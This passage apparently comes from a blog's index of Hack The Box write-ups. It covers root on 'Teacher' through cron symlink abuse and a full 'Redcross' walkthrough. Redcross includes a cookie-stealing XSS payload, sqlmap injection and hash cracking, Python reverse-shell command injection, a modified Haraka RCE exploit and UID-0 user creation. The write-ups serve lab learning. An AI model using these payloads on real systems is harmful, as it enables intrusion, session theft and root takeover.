https://hashkiller.co.uk/md5-decrypter.aspx.www-data@teacher:/$ su -l giovanniPassword: expelledgiovanni@teacher:~$ cat user.txtcat user.txtfa9ae...Priv escThe /home/giovanni/work directory contains a bunch of files, but the backup_courses.tar.gz timestamp keep changing every minute so we can assume the file is being created by a cron job running as root:giovanni@teacher:~/work$ ls -lRls -lR.:total 8drwxr-xr-x 3 giovanni giovanni 4096 Jun 27 04:58 coursesdrwxr-xr-x 3 giovanni giovanni 4096 Jun 27 04:34 tmp./courses:total 4drwxr-xr-x 2 root root 4096 Jun 27 04:15 algebra./courses/algebra:total 4-rw-r--r-- 1 giovanni giovanni 109 Jun 27 04:12 answersAlgebra./tmp:total 8-rwxrwxrwx 1 root root  256 Dec  2 03:52 backup_courses.tar.gzdrwxrwxrwx 3 root root 4096 Jun 27 04:58 courses./tmp/courses:total 4drwxrwxrwx 2 root root 4096 Jun 27 04:15 algebra./tmp/courses/algebra:total 4-rwxrwxrwx 1 giovanni giovanni 109 Jun 27 04:12 answersAlgebragiovanni@teacher:~/work$ dateSun Dec  2 03:52:38 CET 2018The backup script that runs as root is located in /usr/bin/backup.sh:#!/bin/bashcd /home/giovanni/work;tar -czvf tmp/backup_courses.tar.gz courses/*;cd tmp;tar -xf backup_courses.tar.gz;chmod 777 * -R;We can get the root flag by replacing the courses directory with a symlink to /root, waiting for the next archive to be created then untar it to retrieve the root flag:giovanni@teacher:~/work$ mv courses testgiovanni@teacher:~/work$ ln -s /root courses[ ... wait a minute ...]giovanni@teacher:~/work/tmp/courses$ cat root.txtcat root.txt4f3a8...The cronjob changes the permissions to 777 when it extracts the backup archive. If we swap the courses directory in the ~/work/tmp folder with a symlink to /etc it‚Äôll change the permissions of /etc and everything in it to 777:giovanni@teacher:~/work/tmp$ rm -rf coursesgiovanni@teacher:~/work/tmp$ ln -s /etc coursesgiovanni@teacher:~/work/tmp$ ls -l / | grep etcls -l / | grep etcdrwxrwxrwx 85 root root  4096 Apr 18 21:55 etcNow that we have complete read-write access to anything in /etc we can change the password of the root user to anything we want:giovanni@teacher:/etc$ mkpasswd -m sha-512 yolo1234$6$jfdDr.oQ3xp6H/Em$iIPF1i31pZ/SeZe31/LDhruZFflDbmiFdsln.BA2w./lOtMUHMZYLOwsPAJaufSB4/Sn/gNIwZMWquEGR.sh1/After editing the /etc/shadow file we can log in as root:giovanni@teacher:/etc$ su -l rootPassword: root@teacher:~# iduid=0(root) gid=0(root) groups=0(root)"
  },
  
  {
    "title": "Redcross - Hack The Box",
    "url": "/posts/htb-writeup-redcross/",
    "categories": "hackthebox, infosec",
    "tags": "linux, xss, sqli, command injection, pgsql, cve, nss",
    "date": "2019-04-13 00:00:00 +0800",
    





    
    "snippet": "Redcross has a bit of everything: Cross-Site Scripting, a little bit of SQL injection, reviewing C source code to find a command injection vulnerability, light exploit modification and enumeration....",
    "content": "Redcross has a bit of everything: Cross-Site Scripting, a little bit of SQL injection, reviewing C source code to find a command injection vulnerability, light exploit modification and enumeration.Quick summary  XSS on contact form to get admin cookie  SQLi to get user creds (rabbit hole, credentials are not useful)  Find admin.redcross.htb sub-domain page  Log in to admin page using admin session cookie we stole with XSS  Create a shell account, log in to restricted shell, get source code of binary  Command injection in firewall control module, get reverse shell as www-data  Locate Haraka installation, use and modify exploit from exploit-db, gain shell as user penelope  Get DB connection string from /etc/nss-pgsql.conf, create new user with GID 0  Read /etc/nss-pgsql-root.conf, locate new DB connection string  Create new user user with UID and GID 0, su to new user and gain root accessTools/Exploits/CVEs used  Haraka &lt; 2.8.9 - Remote Command ExecutionPortscanOnly SSH and web ports are open:root@ragingunicorn:~# nmap -F 10.10.10.113Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-10 14:19 ESTNmap scan report for 10.10.10.113Host is up (0.019s latency).Not shown: 97 filtered portsPORT    STATE SERVICE22/tcp  open  ssh80/tcp  open  http443/tcp open  httpsIntra webpagehttp://redcross.htb redirects to https://intra.redcross.htb/?page=login so we need to add that to our local hostfile.The main page contains a simple login form:At first glance, the login form doesn‚Äôt appear to be vulnerable to SQL injections but after trying a few user/password combinations, we are able to log in with the guest/guest credentials and we see the following message:So we know there‚Äôs at least two users: admin and guest.Because this is a messaging application, we can assume that admin will be checking messages periodically so we will try to get the admin session cookie with an XSS. Back on the main page, there is a contact form we can use to send messages to the administrator.The first two fields subject and body don‚Äôt appear to be vulnerable to XSS because the input is filtered. We get the following error message when we try to inject stuff like &lt;script&gt;....: Oops! Someone is trying to do something nasty...But the last field, cbody is not filtered and accepts any characters we send.To test the XSS, we‚Äôll try a very simple payload that‚Äôll create an image on the page pointing to our attacker machine. The request will contain the document.cookie which hopefully contains the session cookie.Payload: &lt;script&gt;var myimg = new Image(); myimg.src = 'http://10.10.14.23/q?=' + document.cookie;&lt;/script&gt;After a minute or so, we can see an incoming HTTP request made to our webserver, containg the admin session cookie:root@ragingunicorn:~# python -m SimpleHTTPServer 80Serving HTTP on 0.0.0.0 port 80 ...10.10.10.113 - - [11/Nov/2018 12:00:47] code 404, message File not found10.10.10.113 - - [11/Nov/2018 12:00:47] \"GET /q?=PHPSESSID=8e2u3570ceoa9vk2vofvgnibv3;%20LANG=EN_US;%20SINCE=1541955270;%20LIMIT=10;%20DOMAIN=admin HTTP/1.1\" 404 -Using Firefox‚Äôs web developer tools, we can simply change the cookies and add all four values into our session, then hit refresh on the main page to log in as admin.SQL injection on the web messaging appBased on the messages we see, we find the following users created in the database/system:  admin  penelope  charles  guestTwo parameters are vulnerable to SQL injections:  o parameter in GET /?o=2&amp;page=appExample:GET /?o=2'&amp;page=app HTTP/1.1DEBUG INFO: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1' or dest like '2'') LIMIT 10' at line 1  LIMIT cookie in GET /?o=2&amp;page=appExample:Cookie: domain=admin; lang=EN_US; PHPSESSID=8e2u3570ceoa9vk2vofvgnibv3; LIMIT=10'DEBUG INFO: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1Our best bet is to try to exploit the o parameter as exploiting the LIMIT cookie will be more difficult since we can‚Äôt do UNION SELECT after a LIMIT statement. We might be able to do something with PROCEDURE ANALYSE but since the box is rated medium/hard, I didn‚Äôt think this was going to be it.The first thing we notice with sqlmap is it kills the webserver pretty quickly, so I assumed there is some kind of WAF rate-limiting the connections to the server. If we wait a bit, we are able to access the server again.To use sqlmap, we will need to change the delay parameter to 1 second. It takes a long time but sqlmap eventually find the injection point:root@ragingunicorn:~# sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1 --technique=UE...[13:00:14] [INFO] parsing HTTP request from 'login.req'[13:00:14] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.02' from file '/usr/share/sqlmap/txt/user-agents.txt'[13:00:14] [INFO] testing connection to the target URLsqlmap got a 301 redirect to 'https://intra.redcross.htb/?o=2&amp;page=app'. Do you want to follow? [Y/n] y[13:00:17] [INFO] heuristic (basic) test shows that GET parameter 'o' might be injectable (possible DBMS: 'MySQL')[13:00:18] [INFO] heuristic (XSS) test shows that GET parameter 'o' might be vulnerable to cross-site scripting (XSS) attacks[13:00:18] [INFO] testing for SQL injection on GET parameter 'o'for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) value? [Y/n] [13:00:19] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'[13:00:20] [WARNING] reflective value(s) found and filtering out[13:01:17] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'[13:02:14] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'[13:03:11] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'[13:04:08] [INFO] testing 'MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'[13:05:04] [INFO] testing 'MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'[13:06:01] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'[13:06:20] [INFO] GET parameter 'o' is 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable [13:06:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[13:06:20] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[13:06:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[13:06:42] [INFO] target URL appears to be UNION injectable with 4 columnsinjection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] [14:12:39] [INFO] testing 'MySQL UNION query (63) - 21 to 40 columns'[14:13:03] [INFO] testing 'MySQL UNION query (63) - 41 to 60 columns'[14:13:28] [INFO] testing 'MySQL UNION query (63) - 61 to 80 columns'[14:13:53] [INFO] testing 'MySQL UNION query (63) - 81 to 100 columns'[14:14:19] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expectedGET parameter 'o' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 469 HTTP(s) requests:---Parameter: o (GET)    Type: error-based    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: o=2') AND (SELECT 6000 FROM(SELECT COUNT(*),CONCAT(0x71717a7671,(SELECT (ELT(6000=6000,1))),0x716a767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- scxH&amp;page=app---[14:33:52] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Debian 9.0 (stretch)web application technology: Apache 2.4.25back-end DBMS: MySQL &gt;= 5.0[14:33:52] [INFO] fetched data logged to text files under '/root/.sqlmap/output/intra.redcross.htb'[*] shutting down at 14:33:52Listing databases: sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1.0 --technique=UE -T users --dbs[14:38:26] [INFO] used SQL query returns 2 entries[14:38:27] [INFO] retrieved: information_schema[14:38:28] [INFO] retrieved: redcrossavailable databases [2]:[*] information_schema[*] redcrossListing tables from redcross DB: sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1.0 --technique=UE -D redcross --tables[14:38:41] [INFO] retrieved: messages[14:38:42] [INFO] retrieved: requests[14:38:44] [INFO] retrieved: usersDatabase: redcross[3 tables]+----------+| messages || requests || users    |+----------+Dumping list of users: sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1.0 --technique=UE -D redcross -T users --dumpDatabase: redcrossTable: users[5 entries]+----+------+------------------------------+----------+--------------------------------------------------------------+| id | role | mail                         | username | password                                                     |+----+------+------------------------------+----------+--------------------------------------------------------------+| 1  | 0    | admin@redcross.htb           | admin    | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. || 2  | 1    | penelope@redcross.htb        | penelope | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS || 3  | 1    | charles@redcross.htb         | charles  | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i || 4  | 100  | tricia.wanderloo@contoso.com | tricia   | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. || 5  | 1000 | non@available                | guest    | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi |+----+------+------------------------------+----------+--------------------------------------------------------------+The password are stored with the bcrypt password hashing function, which is very slow to brute force. After letting hashcat (hashcat -a 0 -m 3200) run for some time I was able to recover the following hashes:  guest / guest  penelope / alexx  charles / cookiemonsterNone of them work to log in with SSH but we are able to see a few additional messages when logging in with the web messaging application.  Please could you check the admin webpanel? idk what happens but when I‚Äôm checking the messages, alerts popping everywhere!! Maybe a virus?  Hey, my chief contacted me complaining about some problem in the admin webapp. I thought that you reinforced security on it‚Ä¶ Alerts everywhere!!That may be a hint there is another hidden page/sub-domain‚Ä¶Admin web pageThere‚Äôs another host admin.redcross.htb that displays a totally different application:The same cookie we stole from the admin can be used here to log in:Under the user management menu, we can see and add users to the system:We can SSH with the new user we created:root@ragingunicorn:~# ssh snowscan@10.10.10.113snowscan@10.10.10.113's password: Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.$ lsbin  dev  etc  home  lib  lib64  root  usr$ iduid=2020 gid=1001(associates) groups=1001(associates)This is some kind of chroot jail, there‚Äôs not much we can do here. However we do find a single C source file: iptctl.c$ pwd/home/public/src$ cat iptctl.c /* * Small utility to manage iptables, easily executable from admin.redcross.htb * v0.1 - allow and restrict mode * v0.3 - added check method and interactive mode (still testing!) */...The file contains the program code that is called by the firewall management application on the admin page:Whenever we add/delete an IP from the firewall ACL‚Äôs, the PHP code does a system() call to run the iptctl application and make changes to the firewall rules. If we add a semi-colon in the id parameter we are able to inject commands and gain code execution.Example payload like the following: ip=1;id&amp;action=denyUsage: /opt/iptctl/iptctl allow|restrict|show IPuid=33(www-data) gid=33(www-data) groups=33(www-data)uid=33(www-data) gid=33(www-data) groups=33(www-data)Since we now have RCE, we can use a standard python reverse shell command to get shell on the system.Payload: ip=1;python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((\"10.10.14.23\",4444))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call([\"/bin/sh\",\"-i\"])%3b'&amp;action=denyAnd we get a shell!root@ragingunicorn:~/hackthebox/Machines/Redcross# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.113] 51712/bin/sh: 0: can't access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$ hostnameredcrosswww-data@redcross:/home/penelope$ ls -l ls -l total 8drwxrwx--- 6 penelope mailadm  4096 Jun  7 17:59 haraka-rw-r----- 1 root     penelope   33 Jun  7 18:18 user.txtwww-data@redcross:/home/penelope$ cat user.txtcat user.txtcat: user.txt: Permission deniedWe still can‚Äôt read user.txt since it‚Äôs owned by penelope‚Ä¶ Gotta try harder I guess.Priv esc to penelopePenelope‚Äôs home directory contains the haraka directory. Haraka is an SMTP email server written in Node.js and contains at least one vulnerability according to Exploit-DB:-----------------------------------------Haraka &lt; 2.8.9 - Remote Command Execution/linux/remote/41162.py-----------------------------------------Shellcodes: No ResultThe server is running but doesn‚Äôt appear to be listening on port 25:www-data@redcross:/home/penelope$ ps waux | grep harakaps waux | grep harakapenelope  1199  0.0  1.9 994608 20068 ?        Ssl  09:47   0:02 node /usr/bin/haraka -c /home/penelope/harakawww-data@redcross:/home/penelope$ telnet 127.0.0.1 25telnet 127.0.0.1 25Trying 127.0.0.1...telnet: Unable to connect to remote host: Connection refusedwww-data@redcross:/home/penelope$ netstat -panutnetstat -panutbash: netstat: command not foundNetstat is not installed so I went back to the firewall control page added a whitelist entry for my IP address and scanned the box again with nmap:root@ragingunicorn:~# nmap -p- 10.10.10.113Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-11 15:18 ESTNmap scan report for intra.redcross.htb (10.10.10.113)Host is up (0.018s latency).Not shown: 65529 closed portsPORT     STATE SERVICE21/tcp   open  ftp22/tcp   open  ssh80/tcp   open  http443/tcp  open  https1025/tcp open  NFS-or-IIS5432/tcp open  postgresql1025 looks interesting but we can‚Äôt connect to it with telnet:root@ragingunicorn:~# telnet 10.10.10.113 25Trying 10.10.10.113...telnet: Unable to connect to remote host: Connection refusedWe can connect locally though:root@ragingunicorn:~# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.113] 52064/bin/sh: 0: can't access tty; job control turned off$ telnet 127.0.0.1 1025Trying 127.0.0.1...Connected to 127.0.0.1.Escape character is '^]'.220 redcross ESMTP Haraka 2.8.8 readyquitThe exploit needs to be modified slightly because the port is hardcoded and needs to be changed to 1025.Line 123 needs to be changed to the following:...s = smtplib.SMTP(mailserver,1025)...We can use vi to create the exploit .py file in /dev/shm, then execute it to spawn a reverse shell:Note: The email address must contain the redcross.htb domain.www-data@redcross:/dev/shm$ ./h.py -c \"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.23\\\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\" -t penelope@redcross.htb -f penelope@redcross.htb -m redcrosshtb -m redcrossn/sh\\\",\\\"-i\\\"]);'\" -t penelope@redcross.htb -f penelope@redcross.ho- by Xychix, 26 January 2017 ----o- xychix [at] hotmail.com ----o- exploit haraka node.js mailserver &lt;= 2.8.8 (with attachment plugin activated) ---i- info: https://github.com/haraka/Haraka/pull/1606 (the change that fixed this)Send harariki to penelope@redcross.htb, attachment saved as harakiri-20181111-152151.zip, commandline: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.23\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' , mailserver redcross is used for deliveryContent-Type: multipart/mixed; boundary=\"===============2632093882109835759==\"MIME-Version: 1.0Subject: harakiriFrom: penelope@redcross.htbTo: penelope@redcross.htb--===============2632093882109835759==Content-Type: text/plain; charset=\"us-ascii\"MIME-Version: 1.0Content-Transfer-Encoding: 7bitharakiri--===============2632093882109835759==Content-Type: application/octet-stream; Name=\"harakiri.zip\"MIME-Version: 1.0Content-Transfer-Encoding: base64Content-Disposition: attachment; filename=\"harakiri.zip\"UEsDBBQAAAAIALl6a00BtHNYbAEAAI0BAADyAAAAYSI7cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMjMiLDU1NTUpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc7ZWNobyAiYS56aXAL8GZmEWFgYOBg2FmV7Su+rEFdmJGBgZ2ZgYEHKJqRWJSYnVmUqVdSUTI18HRes4HAnt/abo8meZiqyGSIbP2+Kj5g5atEZr6yU94blnz4/nTiB66gq1Ml1penXU/Oicw4vKlqj35sQtjuRPeeLr5W05mXLjof98pt6Fz090jS/mWSky5efTxl986JM3/Nvaq29vBc8Tixz3kGa3X39Ny+OaVy25dPP+Kv7f0ztzffZC8jyz9pp2VCy6Xkt673/cpy/bC1qupT0zt3/0kGnfILKrWx69y/ILjvpMu2+ceY16/S8eJ1Dva736LCO6VW88IrrqnxoX3Tw3d8O2iX8Dk5onnGyesbvSQiQ9rUGH/mrDuidcMsuHWC2yGV5184zs4RdT/OOXvfpytyr78ct8j/O2lq4JM3e+e282azxgcLaW1QO3YzRCsjKDjnqH6ANyOTCAPu4IOBBkYGtMAM8GZlA4kxAqEVkLYFqwAAUEsBAhQAFAAAAAgAuXprTQG0c1hsAQAAjQEAAPIAAAAAAAAAAAAAAIABAAAAAGEiO3B5dGhvbiAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjIzIiw1NTU1KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsnO2VjaG8gImEuemlwUEsFBgAAAAABAAEAIAEAAHwCAAAAAA==--===============2632093882109835759==--[HARAKIRI SUCCESS] SMTPDataError is most likely an error unzipping the archive, which is what we want [plugin timeout]www-data@redcross:/dev/shm$ root@ragingunicorn:~/hackthebox/Machines/Redcross# nc -lvnp 5555listening on [any] 5555 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.113] 33380/bin/sh: 0: can't access tty; job control turned off$ iduid=1000(penelope) gid=1000(penelope) groups=1000(penelope)$ cat user.txtcat: user.txt: No such file or directory$ pwd/$ cd /home/penelope$ cat user.txtac899b...Priv esc to rootThe NSS plugin is installed, so SSH can authenticate users from the postgresql database instead of /etc/passwd$ cat nss-pgsql.confconnectionstring        = hostaddr=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw connect_timeout=1We can‚Äôt read the other file though‚Ä¶$ cat nss-pgsql-root.confcat: nss-pgsql-root.conf: Permission deniedWith the credentials we can poke inside the database:penelope@redcross:/etc$ psql -h 127.0.0.1 -U unixnss -W unixpsql -h 127.0.0.1 -U unixnss -W unixPassword for user unixnss: fios@ew023xnwpsql (9.6.7)SSL connection (protocol: TLSv1.2, cipher: ECDHE-RSA-AES256-GCM-SHA384, bits: 256, compression: off)Type \"help\" for help.unix=&gt; \\d\\d              List of relations Schema |     Name     |   Type   |  Owner   --------+--------------+----------+---------- public | group_id     | sequence | postgres public | group_table  | table    | postgres public | passwd_table | table    | postgres public | shadow_table | table    | postgres public | user_id      | sequence | postgres public | usergroups   | table    | postgres(6 rows)Here we can see the user table in which the user we created resides:unix=&gt; select * from passwd_table;select * from passwd_table; username |               passwd               | uid  | gid  | gecos |    homedir     |   shell   ----------+------------------------------------+------+------+-------+----------------+----------- tricia   | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 |       | /var/jail/home | /bin/bash snowscan | $1$ANxI97CM$noo3OJtS7FevXzzfR//ih0 | 2020 | 1001 |       | /var/jail/home | /bin/bash(2 rows)We‚Äôll try adding a new user with password yolo1234 and set it‚Äôs UID and GID to 0:unix=&gt; insert into passwd_table (username, passwd, uid, gid, homedir) values ('snowscan','$6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UAzEdZxhzd/MbSyjR5Kp1x4rtNCgHsJ1',0,0,'/root');ERROR:  permission denied for relation passwd_tableToo bad, this user doesn‚Äôt have access‚Ä¶ But the web application probably has an account that has the correct rights to add users since we were able to create a user from the web interface earlier.The /var/www/html/admin/pages/actions.php file contains the credentials we are looking for: unixusrmgr / dheu%7wjx8B&amp;if($action==='adduser'){\t$username=$_POST['username'];\t$passw=generateRandomString();\t$phash=crypt($passw);\t$dbconn = pg_connect(\"host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;\");\t$result = pg_prepare($dbconn, \"q1\", \"insert into passwd_table (username, passwd, gid, homedir) values ($1, $2, 1001, '/var/jail/home')\");\t$result = pg_execute($dbconn, \"q1\", array($username, $phash));\techo \"Provide this credentials to the user:&lt;br&gt;&lt;br&gt;\";\techo \"&lt;b&gt;$username : $passw&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;a href=/?page=users&gt;Continue&lt;/a&gt;\";}Let‚Äôs try the same SQL query again with these credentials:unix=&gt; insert into passwd_table (username, passwd, uid, gid, homedir) values ('snowscan','$6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UAzEdZxhzd/MbSyjR5Kp1x4rtNCgHsJ1',0,0,'/root');ERROR:  permission denied for relation passwd_tableUgh. Same problem again, let‚Äôs try adding a user without setting the UID, but only the GID:unix=&gt; insert into passwd_table (username, passwd, gid, homedir) values ('snowscan','$6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UAzEdZxhzd/MbSyjR5Kp1x4rtNCgHsJ1',0,'/root');ERROR:  duplicate key value violates unique constraint \"passwd_table_username_key\"DETAIL:  Key (username)=(snowscan) already exists.unix=&gt; insert into passwd_table (username, passwd, gid, homedir) values ('snowscan2','$6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UAzEdZxhzd/MbSyjR5Kp1x4rtNCgHsJ1',0,'/root');INSERT 0 1unix=&gt; select * from passwd_table; username  |                                               passwd                                               | uid  | gid  | gecos |    homedir     |   shell   -----------+----------------------------------------------------------------------------------------------------+------+------+-------+----------------+----------- tricia    | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp.                                                                 | 2018 | 1001 |       | /var/jail/home | /bin/bash snowscan  | $1$ANxI97CM$noo3OJtS7FevXzzfR//ih0                                                                 | 2020 | 1001 |       | /var/jail/home | /bin/bash snowscan2 | $6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UAzEdZxhzd/MbSyjR5Kp1x4rtNCgHsJ1 | 2022 |    0 |       | /root          | /bin/bash(3 rows)Allright, we can log in now, but still don‚Äôt have access to read root.txt, we‚Äôll need to have a UID of 0 to do that:snowscan2@redcross:~$ ls -ltotal 12drwxr-xr-x  3 root root 4096 Jun  6 14:05 bindrwxrwxr-x 11 root root 4096 Jun  7 17:32 Haraka-2.8.8-rw-------  1 root root   33 Jun  8 06:51 root.txtsnowscan2@redcross:~$ cat root.txtcat: root.txt: Permission deniedWe can now read nss-pgsql-root.conf since we are part of root‚Äôs group and we find more credentials: unixnssroot / 30jdsklj4d_3snowscan2@redcross:/etc$ ls -l nss-pgsql-root.conf-rw-rw---- 1 root root 540 Jun  8 06:24 nss-pgsql-root.confsnowscan2@redcross:/etc$ cat nss-pgsql-root.confshadowconnectionstring = hostaddr=127.0.0.1 dbname=unix user=unixnssroot password=30jdsklj4d_3 connect_timeout=1shadowbyname = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE username = $1 ORDER BY lastchange DESC LIMIT 1;shadow = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE (username,lastchange) IN (SELECT username, MAX(lastchange) FROM shadow_table GROUP BY username);Using this account, we are able to create a new user with UID 0:unix=&gt; insert into passwd_table (username, passwd, uid,gid, homedir) values ('snowscan_root','$6$oTkOZvS...',0,0,'/root');INSERT 0 1unix=&gt; select * from passwd_table;   username    |                                               passwd                                               | uid  | gid  | gecos |    homedir     |   shell   ---------------+----------------------------------------------------------------------------------------------------+------+------+-------+----------------+----------- tricia        | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp.                                                                 | 2018 | 1001 |       | /var/jail/home | /bin/bash snowscan      | $1$ANxI97CM$NZZ3OJtS7FevXzzfR//ih0                                                                 | 2020 | 1001 |       | /var/jail/home | /bin/bash snowscan2     | $6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UCzEdZxhzd/MbSy2R5Kp1x4rtNCgHsJ1 | 2022 |    0 |       | /root          | /bin/bash snowscan_root | $6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UCzEdZxhzd/MbSy2R5Kp1x4rtNCgHsJ1 |    0 |    0 |       | /root          | /bin/bash(4 rows)We can‚Äôt SSH in with this account because of the SSH server settings:snowscan2@redcross:/etc/ssh$ grep -i root sshd_configPermitRootLogin prohibit-passwordBut we can su to the new user and get the root flagsnowscan2@redcross:/etc/ssh$ su -l snowscan_rootPassword:snowscan_root@redcross:~# iduid=0(snowscan_root) gid=0(root) groups=0(root)snowscan_root@redcross:~# cat /root/root.txt892a1f..."
  },
  
  {
    "title": "Vault - Hack The Box",
    "url": "/posts/htb-writeup-vault/",
    "categories": "hackthebox, infosec",
    "tags": "linux, php, openvpn, firewall, pivoting, gpg",
    "date": "2019-04-06 00:00:00 +0800",
    





    
    "snippet": "Quick summary  An upload page allows us to get RCE by uploading a PHP file with the php5 file extension  We can find the SSH credentials in a plaintext file in Dave‚Äôs directory  After getting a foo...",
    "content": "Quick summary  An upload page allows us to get RCE by uploading a PHP file with the php5 file extension  We can find the SSH credentials in a plaintext file in Dave‚Äôs directory  After getting a foothold on the box, we find another network segment with another machine on it  The machine has OpenVPN installed and already has a backdoored ovpn configuration file that let us get a reverse shell there  There‚Äôs yet another network segment and host that we discover by looking at the routing table and host file  The next target is protected by a firewall but the firewall allows us to connect through it by changing the source port of our TCP session  After logging in to the last box we find a gpg encrypted file which we can decrypt on the host OS since we have the private key and the passwordDetailed stepsNmapPort 22 and 80 are open:# Nmap 7.70 scan initiated Sat Nov  3 23:09:53 2018 as: nmap -F -sC -sV -oA vault 10.10.10.109Nmap scan report for vault.htb (10.10.10.109)Host is up (0.023s latency).Not shown: 98 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 